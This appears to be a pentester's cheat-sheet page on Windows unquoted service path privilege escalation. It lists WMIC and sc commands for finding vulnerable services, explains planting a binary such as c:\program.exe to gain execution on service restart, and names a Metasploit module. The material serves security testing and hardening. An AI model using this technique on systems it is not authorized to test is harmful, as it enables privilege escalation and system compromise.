# Unquoted Service Paths

## Using WMIC

```bash
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
```

## Using sc

```bash
sc query
sc qc service name
```

## Look for Binary\_path\_name and See if it is Unquoted

* if the path contains a space and is not quoted, the service is vulnerable

## Exploit It

* if the path to the binary is

```bash
c:\Program Files\something\winamp.exe
```

* we can place a binary like this

```bash
c:\program.exe
```

* when the program is restarted it will execute the binary program.exe, which we of course control
* we can do this in any directory that has a space in its name, not only program files

## Metasploit Module

```bash
exploit/windows/local/trusted_service_path
```

## Resources

* [http://toshellandback.com/2015/11/24/ms-priv-esc/](http://toshellandback.com/2015/11/24/ms-priv-esc/)
